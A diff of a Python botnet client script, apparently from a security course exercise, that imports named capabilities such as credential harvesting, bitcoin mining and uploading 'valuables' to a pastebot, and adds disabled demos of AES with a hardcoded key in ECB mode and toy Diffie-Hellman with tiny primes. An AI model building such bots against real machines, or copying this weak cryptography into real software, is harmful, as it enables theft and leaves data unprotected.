@@ -2,22 +2,27 @@ import socket
 import time
 import threading
 import sys
+import struct
+from Crypto.Hash import SHA256
 
+from lib.RobotRichardSimmons import RobotRichardSimmons
 from lib.comms import StealthConn
 from lib.evil import bitcoin_mine, harvest_user_pass
 from lib.p2p import find_bot, bot_server
-from lib.files import download_from_pastebot, filestore, p2p_upload_file, save_valuable, upload_valuables_to_pastebot, valuables
+from lib.files import download_from_pastebot, filestore, p2p_upload_file, save_valuable, upload_valuables_to_pastebot, \
+    valuables
+from lib.helpers import read_hex
+from Crypto.Cipher import AES
 
 def p2p_upload(fn):
     sconn = find_bot()
     sconn.send(bytes("FILE", "ascii"))
     p2p_upload_file(sconn, fn)
 
+
 def p2p_echo():
     try:
         sconn = find_bot()
-        # Set verbose to true so we can view the encoded packets
-        sconn.verbose = True
         sconn.send(bytes("ECHO", "ascii"))
         while 1:
             # Read a message and send it to the other bot
@@ -27,7 +32,7 @@ def p2p_echo():
             # This other bot should echo it back to us
             echo = sconn.recv()
             # Ensure that what we sent is what we got back
-            assert(echo == byte_msg)
+            assert (echo == byte_msg)
             # If the msg is X, then terminate the connection
             if msg.lower() == 'x' or msg.lower() == "exit" or msg.lower() == "quit":
                 sconn.close()
@@ -35,10 +40,67 @@ def p2p_echo():
     except socket.error:
         print("Connection closed unexpectedly")
 
+
 if __name__ == "__main__":
 
+
+    if (False):
+        shared_key = 'askldfjasdgldljsalglsajglasjldsjfoweijfsandblhsaghaiwejgfaldsjglawiejglajglksagllilsigehsgdnbsei'[:32]
+        cipher = AES.new(shared_key)
+
+        data = 'this is the new shit'
+        print("Original data: {}".format(data))
+        print("Original data length: {}".format(len(data)))
+
+        data = bytes(data, "ascii")
+        length = 16 - (len(data) % 16)
+        data += ' '.encode() * length
+
+        print("Padded data length: {}".format(len(data)))
+
+
+        encrypted_data = cipher.encrypt(data)
+
+
+        print("Encrypted data: {}".format(repr(encrypted_data)))
+        print("Sending packet of length {}".format(len(encrypted_data)))
+
+        pkt_len_packed = struct.pack('H', len(encrypted_data))
+
+        unpacked_contents = struct.unpack('H', pkt_len_packed)
+        pkt_len = unpacked_contents[0]
+
+        decrypted_data = cipher.decrypt(encrypted_data)
+        print("Receiving packet of length {}".format(pkt_len))
+        print("Encrypted data: {}".format(repr(encrypted_data)))
+        print("Decrypted data: {}".format(decrypted_data))
+        print("Original data: {}".format(decrypted_data.decode("ascii").rstrip()))
+
+        sys.exit()
+    """
+
+    # Prime numbers
+    prime1 = 17
+    prime2 = 47
+
+
+    robot1 = RobotRichardSimmons('Richard Simmons', prime1, prime2)
+    robot2 = RobotRichardSimmons('Aretha Franklin', prime1, prime2)
+
+    print("The prime numbers are %d and %d" % (prime1, prime2))
+    print(robot1.name + " public key: " + str(robot1.public_key))
+    print(robot2.name + " public key: " + str(robot2.public_key))
+
+    robot1.generate_shared_key(robot2.public_key)
+    robot2.generate_shared_key(robot1.public_key)
+
+    print("The shared key is " + str(robot1.shared_key))
+    print("The shared key is " + str(robot2.shared_key))
+    # robot1.public_key ** ??? % prime2 == robot2.public_key ** ??? % prime2
+    sys.exit() # YOU SHALL NOT PASS!
+    """
     # Start a new thread to accept P2P echo or P2P upload requests
-    thr = threading.Thread(target=bot_server, args=("bot1",))
+    thr = threading.Thread(target=bot_server)
     # Daemon threads exit when the main program exits
     # This means the server will shut down automatically when we quit
     thr.setDaemon(True)
@@ -46,49 +108,6 @@ if __name__ == "__main__":
     # Wait for a small amount of time so that the output
     # doesn't play around with our "command prompt"
     time.sleep(0.3)
-
-
-    # bot2
-    thr2 = threading.Thread(target=bot_server, args=("bot2",))
-    thr2.setDaemon(True)
-    thr2.start()
-    time.sleep(0.3)
-
-
-
-
-    print("bot1 connecting to bot2 on port %d" % 1338)
-    conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    conn.connect(("localhost", 1338))
-    sconn = StealthConn(conn, client=True)
-
-
-
-
-    sconn.send(bytes("FILE", "ascii"))
-    p2p_upload_file(sconn, "README")
-
-
-
-    """
-    upload_valuables_to_pastebot('hello.fbi')
-    upload_valuables_to_pastebot('hello.signed')
-    upload_valuables_to_pastebot('README')
-    upload_valuables_to_pastebot('README.md')
-    upload_valuables_to_pastebot('LICENSE')
-
-
-
-
-    download_from_pastebot('hello.fbi')
-    download_from_pastebot('hello.signed')
-
-    print("Files stored by this bot: %s" % ", ".join(filestore.keys()))
-    print("Valuables stored by this bot: %s" % valuables)
-
-    sys.exit()
-    """
-
 
     while 1:
         # Naive command loop
